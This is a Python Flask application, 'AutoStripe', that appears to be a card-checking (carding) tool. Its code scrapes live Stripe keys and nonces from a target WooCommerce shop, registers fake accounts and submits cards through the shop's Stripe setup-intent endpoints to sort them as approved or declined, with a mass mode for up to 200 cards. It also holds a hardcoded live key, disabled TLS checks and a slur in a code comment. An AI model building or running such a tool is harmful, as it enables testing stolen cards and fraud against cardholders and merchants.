from flask import Flask, jsonify, render_template_string, request
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)


mass_check_results = {}
mass_check_status = {}


@app.route('/')
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>AutoStripe API - DEVELOPER: @ryuxx_x</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --bg: #050505;
                --primary: #00f2fe;
                --secondary: #7000ff;
                --accent: #ff00de;
                --success: #00ff88;
                --card-bg: rgba(15, 15, 25, 0.7);
                --text: #ffffff;
                --border: rgba(255, 255, 255, 0.1);
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: 'Inter', 'Poppins', sans-serif;
                background-color: var(--bg);
                background-image: 
                    radial-gradient(circle at 10% 20%, rgba(0, 242, 254, 0.15) 0%, transparent 40%),
                    radial-gradient(circle at 90% 80%, rgba(112, 0, 255, 0.15) 0%, transparent 40%),
                    radial-gradient(circle at 50% 50%, rgba(255, 0, 222, 0.05) 0%, transparent 60%);
                min-height: 100vh;
                color: var(--text);
                overflow-x: hidden;
            }

            .bg-glow {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
                pointer-events: none;
                background: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3%3Cfilter id='noiseFilter'%3%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3%3C/filter%3%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3%3C/svg%3");
                opacity: 0.03;
            }

            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 60px 20px;
            }

            header {
                text-align: center;
                margin-bottom: 80px;
                position: relative;
            }

            .logo {
                font-size: 5rem;
                font-weight: 900;
                letter-spacing: -3px;
                background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                filter: drop-shadow(0 0 30px rgba(0, 242, 254, 0.4));
                margin-bottom: 10px;
                animation: float 6s ease-in-out infinite;
            }

            @keyframes float {
                0%, 100% { transform: translateY(0px); }
                50% { transform: translateY(-20px); }
            }

            .tagline {
                font-size: 1.2rem;
                color: rgba(255, 255, 255, 0.6);
                font-weight: 400;
                letter-spacing: 2px;
                text-transform: uppercase;
            }

            .status-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(255, 255, 255, 0.03);
                padding: 10px 24px;
                border-radius: 100px;
                margin-top: 30px;
                border: 1px solid var(--border);
                backdrop-filter: blur(10px);
            }

            .status-dot {
                width: 8px;
                height: 8px;
                background: var(--success);
                border-radius: 50%;
                margin-right: 12px;
                box-shadow: 0 0 15px var(--success);
            }

            .tabs {
                display: flex;
                background: rgba(255, 255, 255, 0.03);
                padding: 8px;
                border-radius: 20px;
                width: fit-content;
                margin: 0 auto 50px;
                border: 1px solid var(--border);
                backdrop-filter: blur(20px);
            }

            .tab {
                padding: 12px 30px;
                border-radius: 14px;
                cursor: pointer;
                transition: all 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
                font-weight: 600;
                color: rgba(255, 255, 255, 0.5);
            }

            .tab.active {
                background: white;
                color: black;
                box-shadow: 0 10px 30px rgba(255, 255, 255, 0.2);
            }

            .glass-card {
                background: var(--card-bg);
                backdrop-filter: blur(40px);
                border: 1px solid var(--border);
                border-radius: 32px;
                padding: 50px;
                box-shadow: 0 40px 100px rgba(0, 0, 0, 0.5);
                position: relative;
                overflow: hidden;
            }

            .glass-card::before {
                content: "";
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: conic-gradient(from 0deg, transparent, rgba(0, 242, 254, 0.1), transparent 30%);
                animation: rotate 10s linear infinite;
                pointer-events: none;
            }

            @keyframes rotate {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }

            .form-control {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid var(--border);
                border-radius: 16px;
                padding: 18px 24px;
                color: white;
                font-size: 1rem;
                transition: all 0.3s;
                width: 100%;
            }

            .form-control:focus {
                outline: none;
                background: rgba(255, 255, 255, 0.07);
                border-color: var(--primary);
                box-shadow: 0 0 0 4px rgba(0, 242, 254, 0.1);
            }

            .btn-primary {
                background: white;
                color: black;
                padding: 18px;
                border-radius: 16px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 1px;
                transition: all 0.3s;
                border: none;
                cursor: pointer;
                width: 100%;
            }

            .btn-primary:hover {
                transform: translateY(-4px) scale(1.02);
                box-shadow: 0 20px 40px rgba(255, 255, 255, 0.2);
            }

            .result-item {
                background: rgba(255, 255, 255, 0.02);
                border: 1px solid var(--border);
                border-radius: 20px;
                padding: 20px;
                margin-top: 15px;
            }

            .designer-credits {
                margin-top: 20px;
                font-weight: 700;
                background: linear-gradient(to right, var(--primary), var(--accent));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                font-size: 0.9rem;
            }

            ::-webkit-scrollbar { width: 8px; }
            ::-webkit-scrollbar-track { background: var(--bg); }
            ::-webkit-scrollbar-thumb { 
                background: linear-gradient(var(--primary), var(--secondary)); 
                border-radius: 10px; 
            }
            ::-webkit-scrollbar-thumb:hover { background: var(--accent); }

            .glass-card h3 {
                background: linear-gradient(to right, var(--primary), var(--accent));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                display: inline-block;
                margin-bottom: 24px;
            }

            .stat-value {
                background: linear-gradient(to right, #fff, var(--primary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                font-size: 2rem;
                font-weight: 800;
            }

            .result-item.success {
                border-left: 4px solid var(--success);
                background: rgba(0, 255, 136, 0.05);
            }

            .result-item.error {
                border-left: 4px solid var(--error);
                background: rgba(255, 0, 0, 0.05);
            }

            @keyframes pulse {
                0% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.5; transform: scale(1.1); }
                100% { opacity: 1; transform: scale(1); }
            }
        </style>
    </head>
    <body>
        <div class="bg-glow"></div>

        <div class="container">
            <header>
                <div class="logo">AutoStripe</div>
                <div class="tagline">Premium Payment Processing Gateway</div>
                <div class="status-badge">
                    <span class="status-dot"></span>
                    Network Status: Optimized
                </div>
                <div class="designer-credits">DEVELOPER: @ryuxx_x</div>
            </header>

            <div class="tabs">
                <div class="tab active" onclick="switchTab('single')">Single Checker</div>
                <div class="tab" onclick="switchTab('mass')">Mass Checker</div>
                <div class="tab" onclick="switchTab('api')">API Documentation</div>
            </div>

            <!-- Single Checker Tab -->
            <div id="single-tab" class="tab-content active">
                <div class="glass-card">
                    <h3>Single Card Checker</h3>
                    <div class="form-group">
                        <label for="single-site">Site Domain</label>
                        <input type="text" id="single-site" class="form-control" placeholder="example.com">
                    </div>
                    <div class="form-group">
                        <label for="single-cc">Card Details</label>
                        <input type="text" id="single-cc" class="form-control" placeholder="4242424242424242|12|25|123">
                    </div>
                    <button class="btn btn-primary" onclick="checkSingleCard()">
                        <span id="single-loader" style="display:none;" class="loader"></span>
                        Check Card
                    </button>
                    <button class="btn btn-secondary" onclick="clearSingleResults()">Clear Results</button>

                    <div id="single-result" class="result-container">
                        <h4>Result:</h4>
                        <div id="single-result-content"></div>
                    </div>
                </div>
            </div>

            <!-- Mass Checker Tab -->
            <div id="mass-tab" class="tab-content">
                <div class="glass-card">
                    <h3>Mass Card Checker (Max 200 Cards)</h3>
                    <div class="form-group">
                        <label for="mass-site">Site Domain</label>
                        <input type="text" id="mass-site" class="form-control" placeholder="example.com">
                    </div>
                    <div class="form-group">
                        <label for="mass-cc">Card Details (One per line)</label>
                        <textarea id="mass-cc" class="form-control" placeholder="4242424242424242|12|25|123&#10;4000000000000002|12|25|123&#10;..."></textarea>
                    </div>
                    <button class="btn btn-primary" onclick="checkMassCards()">
                        <span id="mass-loader" style="display:none;" class="loader"></span>
                        Check Cards
                    </button>
                    <button class="btn btn-secondary" onclick="clearMassResults()">Clear Results</button>

                    <div id="mass-progress" class="progress-bar" style="display:none;">
                        <div id="mass-progress-fill" class="progress-fill"></div>
                    </div>

                    <div id="mass-stats" class="stats" style="display:none;">
                        <div class="stat-item">
                            <div id="mass-total" class="stat-value">0</div>
                            <div class="stat-label">Total</div>
                        </div>
                        <div class="stat-item">
                            <div id="mass-approved" class="stat-value">0</div>
                            <div class="stat-label">Approved</div>
                        </div>
                        <div class="stat-item">
                            <div id="mass-declined" class="stat-value">0</div>
                            <div class="stat-label">Declined</div>
                        </div>
                        <div class="stat-item">
                            <div id="mass-processed" class="stat-value">0</div>
                            <div class="stat-label">Processed</div>
                        </div>
                    </div>

                    <div id="mass-result" class="result-container">
                        <h4>Results:</h4>
                        <div id="mass-result-content"></div>
                    </div>
                </div>
            </div>

            <!-- API Documentation Tab -->
            <div id="api-tab" class="tab-content">
                <div class="glass-card">
                    <h3>API Documentation</h3>
                    <div class="result-item">
                        <h4>Single Card Processing</h4>
                        <p>Process a single card payment through Stripe</p>
                        <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace;">
                            /try?key=ryu&site=example.com&cc=card_number|mm|yy|cvv
                        </div>
                        <button class="copy-btn" onclick="copyToClipboard('/try?key=ryu&site=example.com&cc=card_number|mm|yy|cvv')">Copy</button>
                    </div>

                    <div class="result-item">
                        <h4>Bulk Card Processing</h4>
                        <p>Process a card against multiple test domains</p>
                        <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace;">
                            /try?key=ryu&cc=card_number|mm|yy|cvv
                        </div>
                        <button class="copy-btn" onclick="copyToClipboard('/try?key=ryu&cc=card_number|mm|yy|cvv')">Copy</button>
                    </div>

                    <div class="result-item">
                        <h4>Health Check</h4>
                        <p>Check API status and availability</p>
                        <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace;">
                            /health
                        </div>
                        <button class="copy-btn" onclick="copyToClipboard('/health')">Copy</button>
                    </div>
                </div>
            </div>

            <footer>
                <p>&copy; 2026 AutoStripe API. All rights reserved. | DEVELOPER: @ryuxx_x | Telegram : https://t.me/+GtCdlkjvW3FiN2Vl</p>
            </footer>
        </div>

        <div id="notification" class="notification"></div>

        <script>
            // Tab switching
            function switchTab(tabName) {
                // Hide all tabs
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });

                // Remove active class from all tab buttons
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });

                // Show selected tab
                document.getElementById(tabName + '-tab').classList.add('active');

                // Add active class to clicked tab button
                event.target.classList.add('active');
            }

            // Show notification
            function showNotification(message, type) {
                const notification = document.getElementById('notification');
                notification.textContent = message;
                notification.className = `notification notification-${type}`;
                notification.classList.add('show');

                setTimeout(() => {
                    notification.classList.remove('show');
                }, 3000);
            }

            // Copy to clipboard
            function copyToClipboard(text) {
                navigator.clipboard.writeText(text).then(() => {
                    showNotification('Copied to clipboard!', 'success');
                });
            }

            // Format card number for display
            function formatCardNumber(cardNumber) {
                if (cardNumber.length <= 4) return cardNumber;
                return cardNumber.substring(0, 4) + 'xxxxxxxxxxxx' + cardNumber.substring(cardNumber.length - 4);
            }

            // Check single card
            function checkSingleCard() {
                const site = document.getElementById('single-site').value.trim();
                const cc = document.getElementById('single-cc').value.trim();
                const resultContainer = document.getElementById('single-result');
                const resultContent = document.getElementById('single-result-content');
                const loader = document.getElementById('single-loader');

                if (!site || !cc) {
                    showNotification('Please fill in all fields', 'error');
                    return;
                }

                // Show loader
                loader.style.display = 'inline-block';

                // Clear previous results
                resultContent.innerHTML = '';
                resultContainer.classList.add('show');
                resultContainer.classList.remove('result-success', 'result-error');

                // Make API request
                fetch(`/try?key=ryu&site=${site}&cc=${cc}`)
                    .then(response => response.json())
                    .then(data => {
                        // Hide loader
                        loader.style.display = 'none';

                        // Display result
                        const cardParts = cc.split('|');
                        const cardNumber = cardParts[0];

                        resultContent.innerHTML = `
                            <div class="result-item ${data.Status === 'Approved' ? 'success' : 'error'}">
                                <div class="card-number">Card: ${formatCardNumber(cardNumber)}</div>
                                <div class="card-response">Response: ${data.Response}</div>
                                <div class="card-status">Status: ${data.Status}</div>
                            </div>
                        `;

                        if (data.Status === 'Approved') {
                            resultContainer.classList.add('result-success');
                            showNotification('Payment successful!', 'success');
                        } else {
                            resultContainer.classList.add('result-error');
                            showNotification('Payment declined', 'error');
                        }
                    })
                    .catch(error => {
                        // Hide loader
                        loader.style.display = 'none';

                        resultContent.innerHTML = `
                            <div class="result-item error">
                                <div class="card-response">Error: ${error.message}</div>
                            </div>
                        `;
                        resultContainer.classList.add('result-error');
                        showNotification('An error occurred', 'error');
                    });
            }

            // Clear single results
            function clearSingleResults() {
                document.getElementById('single-result').classList.remove('show');
                document.getElementById('single-site').value = '';
                document.getElementById('single-cc').value = '';
            }

            // Check mass cards
            function checkMassCards() {
                const site = document.getElementById('mass-site').value.trim();
                const ccText = document.getElementById('mass-cc').value.trim();
                const resultContainer = document.getElementById('mass-result');
                const resultContent = document.getElementById('mass-result-content');
                const progressBar = document.getElementById('mass-progress');
                const progressFill = document.getElementById('mass-progress-fill');
                const statsContainer = document.getElementById('mass-stats');
                const loader = document.getElementById('mass-loader');

                if (!site || !ccText) {
                    showNotification('Please fill in all fields', 'error');
                    return;
                }

                // Parse cards
                const cards = ccText.split('\\n').filter(card => card.trim());

                if (cards.length === 0) {
                    showNotification('Please enter at least one card', 'error');
                    return;
                }

                if (cards.length > 200) {
                    showNotification('Maximum 200 cards allowed', 'error');
                    return;
                }

                // Show loader and progress
                loader.style.display = 'inline-block';
                progressBar.style.display = 'block';
                statsContainer.style.display = 'flex';

                // Initialize stats
                let total = cards.length;
                let approved = 0;
                let declined = 0;
                let processed = 0;

                document.getElementById('mass-total').textContent = total;
                document.getElementById('mass-approved').textContent = approved;
                document.getElementById('mass-declined').textContent = declined;
                document.getElementById('mass-processed').textContent = processed;

                // Clear previous results
                resultContent.innerHTML = '';
                resultContainer.classList.add('show');

                // Process cards
                const results = [];
                let completed = 0;

                cards.forEach((card, index) => {
                    // Create result item
                    const resultItem = document.createElement('div');
                    resultItem.className = 'result-item processing';
                    resultItem.innerHTML = `
                        <div class="card-number">Card: ${formatCardNumber(card.split('|')[0])}</div>
                        <div class="card-response">Processing...</div>
                        <div class="card-status">Status: Checking</div>
                    `;
                    resultContent.appendChild(resultItem);

                    // Make API request
                    fetch(`/try?key=ryu&site=${site}&cc=${card}`)
                        .then(response => response.json())
                        .then(data => {
                            // Update result item
                            resultItem.className = `result-item ${data.Status === 'Approved' ? 'success' : 'error'}`;
                            resultItem.innerHTML = `
                                <div class="card-number">Card: ${formatCardNumber(card.split('|')[0])}</div>
                                <div class="card-response">Response: ${data.Response}</div>
                                <div class="card-status">Status: ${data.Status}</div>
                            `;

                            // Update stats
                            if (data.Status === 'Approved') {
                                approved++;
                            } else {
                                declined++;
                            }
                            processed++;
                            completed++;

                            document.getElementById('mass-approved').textContent = approved;
                            document.getElementById('mass-declined').textContent = declined;
                            document.getElementById('mass-processed').textContent = processed;

                            // Update progress
                            progressFill.style.width = `${(completed / total) * 100}%`;

                            // Check if all cards are processed
                            if (completed === total) {
                                loader.style.display = 'none';
                                showNotification(`Mass check completed! Approved: ${approved}, Declined: ${declined}`, 'info');
                            }
                        })
                        .catch(error => {
                            // Update result item
                            resultItem.className = 'result-item error';
                            resultItem.innerHTML = `
                                <div class="card-number">Card: ${formatCardNumber(card.split('|')[0])}</div>
                                <div class="card-response">Error: ${error.message}</div>
                                <div class="card-status">Status: Error</div>
                            `;

                            // Update stats
                            declined++;
                            processed++;
                            completed++;

                            document.getElementById('mass-declined').textContent = declined;
                            document.getElementById('mass-processed').textContent = processed;

                            // Update progress
                            progressFill.style.width = `${(completed / total) * 100}%`;

                            // Check if all cards are processed
                            if (completed === total) {
                                loader.style.display = 'none';
                                showNotification(`Mass check completed! Approved: ${approved}, Declined: ${declined}`, 'info');
                            }
                        });
                });
            }

            // Clear mass results
            function clearMassResults() {
                document.getElementById('mass-result').classList.remove('show');
                document.getElementById('mass-site').value = '';
                document.getElementById('mass-cc').value = '';
                document.getElementById('mass-progress').style.display = 'none';
                document.getElementById('mass-stats').style.display = 'none';
            }
        </script>
    </body>
    </html>
    """)
#Main Function Niggas Do Not Copy It
def get_stripe_key(domain):
    logger.debug(f"Getting Stripe key for domain: {domain}")
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]

    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]

    for url in urls_to_try:
        try:
            logger.debug(f"Trying URL: {url}")
            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10, verify=False)
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
                            return key_match.group(0)
        except Exception as e:
            logger.error(f"Error getting Stripe key from {url}: {e}")
            continue

    logger.debug("Using default Stripe key")
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def extract_nonce_from_page(html_content, domain):
    logger.debug(f"Extracting nonce from {domain}")
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]

    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            logger.debug(f"Found nonce: {match.group(1)}")
            return match.group(1)

    logger.debug("No nonce found")
    return None

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session):
    logger.debug(f"Registering account on {domain}")
    try:        
        reg_response = session.get(f"https://{domain}/my-account/", verify=False)

        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]

        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break

        if not reg_nonce:
            logger.debug("Could not extract registration nonce")
            return False, "Could not extract registration nonce"

        username, email, password = generate_random_credentials()

        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }

        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'},
            verify=False
        )

        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            logger.debug("Registration successful")
            return True, "Registration successful"
        else:
            logger.debug("Registration failed")
            return False, "Registration failed"

    except Exception as e:
        logger.error(f"Registration error: {e}")
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, use_registration=True):
    logger.debug(f"Processing card for domain: {domain}")
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        logger.error("Invalid card format")
        return {
            "Response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "Status": "Declined"
        }

    if "20" in yy:
        yy = yy.split("20")[1]

    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    stripe_key = get_stripe_key(domain)

    if use_registration:
        registered, reg_message = register_account(domain, session)

    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]

    nonce = None
    for url in payment_urls:
        try:
            logger.debug(f"Trying to get nonce from: {url}")
            response = session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except Exception as e:
            logger.error(f"Error getting nonce from {url}: {e}")
            continue

    if not nonce:
        logger.error("Failed to extract nonce from site")
        return {"Response": "Failed to extract nonce from site", "Status": "Declined"}

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        logger.debug("Creating payment method")
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15,
            verify=False
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            logger.error(f"Payment method error: {error_msg}")
            return {"Response": error_msg, "Status": "Declined"}

        payment_method_id = pm_data['id']
        logger.debug(f"Payment method created: {payment_method_id}")
    except Exception as e:
        logger.error(f"Payment Method Creation Failed: {e}")
        return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined"}

    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]

    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15,
                    verify=False
                )

                try:
                    setup_data = setup_response.json()
                    logger.debug(f"Setup response: {setup_data}")
                except:
                    setup_data = {'raw_response': setup_response.text}
                    logger.debug(f"Setup raw response: {setup_response.text}")

                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        logger.debug("3D authentication required")
                        return {"Response": "3D", "Status": "Declined"}
                    elif data_status == 'succeeded':
                        logger.debug("Payment succeeded")
                        return {"Response": "Card Added ", "Status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        logger.error(f"Payment error: {error_msg}")
                        return {"Response": error_msg, "Status": "Declined"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    logger.error(f"Payment error: {error_msg}")
                    return {"Response": error_msg, "Status": "Declined"}

                if setup_data.get('status') in ['succeeded', 'success']:
                    logger.debug("Payment succeeded")
                    return {"Response": "Card Added", "Status": "Approved"}

            except Exception as e:
                logger.error(f"Setup error: {e}")
                continue

    logger.error("All payment attempts failed")
    return {"Response": "All payment attempts failed", "Status": "Declined"}

@app.route('/try')
def process_request():
    try:
        key = request.args.get('key')
        domain = request.args.get('site')
        cc = request.args.get('cc')

        logger.debug(f"Process request: key={key}, domain={domain}, cc={cc}")

        if key != "ryu":
            logger.error("Invalid API key")
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401

        if not domain:
            logger.error("Missing domain")
            return jsonify({"error": "Missing domain parameter", "status": "Bad Request"}), 400

        #
        if domain.startswith('https://'):
            domain = domain[8:]
        elif domain.startswith('http://'):
            domain = domain[7:]

        if not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
            logger.error(f"Invalid domain: {domain}")
            return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400

        if not cc or not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            logger.error(f"Invalid card format: {cc}")
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400

        result = process_card_enhanced(domain, cc)

        # Ensure consistent response format
        return jsonify({
            "Response": result.get("Response", result.get("response", "Unknown response")),
            "Status": result.get("Status", result.get("status", "Unknown status"))
        })
    except Exception as e:
        logger.error(f"Process request error: {e}")
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route('/bulk')
def bulk_process_request():
    try:
        key = request.args.get('key')
        cc = request.args.get('cc')

        logger.debug(f"Bulk request: key={key}, cc={cc}")

        if key != "ryu":
            logger.error("Invalid API key")
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401

        if not cc or not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            logger.error(f"Invalid card format: {cc}")
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400

        test_domains = [
            "example-shop1.com",
            "example-store2.com", 
            "demo-woocommerce3.com"
        ]

        results = []
        for domain in test_domains:
            try:
                result = process_card_enhanced(domain, cc)
                # Ensure consistent response format
                results.append({
                    "Domain": domain,
                    "Response": result.get("Response", result.get("response", "Unknown response")),
                    "Status": result.get("Status", result.get("status", "Unknown status"))
                })
            except Exception as e:
                logger.error(f"Error processing {domain}: {e}")
                results.append({
                    "Domain": domain,
                    "Response": f"Error: {str(e)}",
                    "Status": "Error"
                })

        return jsonify({"results": results})
    except Exception as e:
        logger.error(f"Bulk request error: {e}")
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500


@app.route('/health')
def health_check():
    return jsonify({"status": "healthy"}), 200


@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found", "status": "Not Found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error", "status": "Error"}), 500

if __name__ == '__main__':

    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)

